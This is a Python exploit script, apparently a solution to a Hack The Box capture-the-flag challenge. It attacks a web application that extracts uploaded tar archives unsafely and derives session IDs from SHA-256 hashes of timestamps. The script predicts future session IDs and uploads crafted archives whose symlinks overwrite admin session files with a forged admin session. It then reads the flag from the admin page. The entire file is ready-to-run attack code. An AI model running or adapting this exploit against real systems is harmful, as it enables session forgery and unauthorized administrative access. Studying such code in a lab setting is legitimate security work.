#!/usr/bin/python3.11

import requests
import time
import hashlib
import tarfile
import os
import subprocess
from pwn import *

# --- Configuration ---
host = "94.237.54.190"
BASE_URL = f"http://{host}:44082"
# BASE_URL = "http://127.0.0.1:1337"
USERNAME = "admin"
PASSWORD = "admin"
FUTURE_SESSION_COUNT = 30
UPLOAD_ENDPOINT = f"{BASE_URL}/user/upload"
LOGIN_ENDPOINT = f"{BASE_URL}/login"
REGISTER_ENDPOINT = f"{BASE_URL}/register"
ADMIN_PAGE = f"{BASE_URL}/user/admin"

# For Burp
PROXY = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}

session = requests.Session()
session.proxies.update(PROXY)
session.verify = False  # Disable SSL verification

def generate_session_id(timestamp=None):
    result = subprocess.run(
        f"echo -n '{timestamp}' | sha256sum | awk '{{print $1}}'",
        capture_output=True, text=True, shell=True
    )
    return result.stdout.strip()

def generate_future_session_ids(count=30):
    future_sessions = []
    current_time = int(time.time())

    for i in range(1, count + 1):
        session_hash = generate_session_id(current_time + i)
        future_sessions.append(session_hash)

    return future_sessions

def register_user():
    print("Registering admin user...")
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = {"username": USERNAME, "password": PASSWORD}  # Send as form data (not JSON)

    response = session.post(REGISTER_ENDPOINT, headers=headers, data=data)  # Use `data=` instead of `json=`

    if response.status_code == 200 or "already exists" in response.text:
        print(f"Registered user '{USERNAME}' successfully (or already exists).")
    else:
        print(f"Failed to register user: {response.text}")


def login(extra_pass=None):
    print("📌 Logging in...")
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    final_pass = PASSWORD
    if extra_pass is not None:
        final_pass = extra_pass
    data = {"username": USERNAME, "password": final_pass}

    response = session.post(LOGIN_ENDPOINT, headers=headers, data=data, allow_redirects=False)

    if response.status_code in [200, 302]:
        print(f"Logged in as '{USERNAME}' successfully!")

        # Clear any existing username cookies first
        session.cookies.clear(domain=host, path="/", name="username")

        # Set the username cookie correctly
        session.cookies.set("username", USERNAME, domain=host, path="/")

        return True
    else:
        print(f"Login failed: {response.text}")
        return False


def create_and_upload_symlink_tar(index, session_id):
    malicious_tar = f"archive{index}.tar"
    target_directory = "/tmp/sessions/admin/"

    # Fake admin session JSON
    admin_session = b'{"username":"admin","id":1,"role":"admin"}'

    symlink_name = f"file{index}"
    payload_name = symlink_name  # Same name as symlink

    with tarfile.open(malicious_tar, "w", format=tarfile.USTAR_FORMAT) as tar:
        session_path = target_directory + session_id

        # Create the Symlink
        symlink_info = tarfile.TarInfo(name=symlink_name)
        symlink_info.type = tarfile.SYMTYPE
        symlink_info.linkname = session_path
        symlink_info.mode = 0o777
        symlink_info.uid = 0
        symlink_info.gid = 0
        symlink_info.uname = "root"
        symlink_info.gname = "root"
        tar.addfile(symlink_info)

    # Write the payload
    with open(payload_name, "wb") as f:
        f.write(admin_session)

    # Add Payload to Tar
    with tarfile.open(malicious_tar, "a", format=tarfile.USTAR_FORMAT) as tar:
        payload_info = tarfile.TarInfo(name=payload_name)
        payload_info.size = len(admin_session)
        payload_info.mode = 0o644
        payload_info.uid = 0
        payload_info.gid = 0
        payload_info.uname = "root"
        payload_info.gname = "root"
        
        with open(payload_name, "rb") as up:
            tar.addfile(payload_info, up)

    os.remove(payload_name)

    print(f"Created tar '{malicious_tar}' with symlink to {session_id}")

    # Upload the Tar
    with open(malicious_tar, "rb") as tar_file:
        files = {"archive": (malicious_tar, tar_file)}
        response = session.post(UPLOAD_ENDPOINT, files=files)

    os.remove(malicious_tar)

    if "Archive uploaded and extracted successfully" in response.text:
        print(f"Successfully uploaded session '{session_id}'")
    else:
        print(f"Upload failed for session '{session_id}': {response.text}")

def get_flag():
    print("Fetching flag...")

    response = session.get(ADMIN_PAGE)
    flag_match = re.search(r'HTB\{[^}]+\}', response.text)

    if flag_match:
        flag = flag_match.group(0)
        print(f"FLAG FOUND: {flag}")
    else:
        print("No flag found. The exploit may have failed.")

if __name__ == "__main__":
    register_user()

    if not login():
        exit()

    future_hashes = generate_future_session_ids(FUTURE_SESSION_COUNT)

    for index, session_id in enumerate(future_hashes, start=1):
        time.sleep(0.05)
        create_and_upload_symlink_tar(index, session_id)

    login("x")
    get_flag()
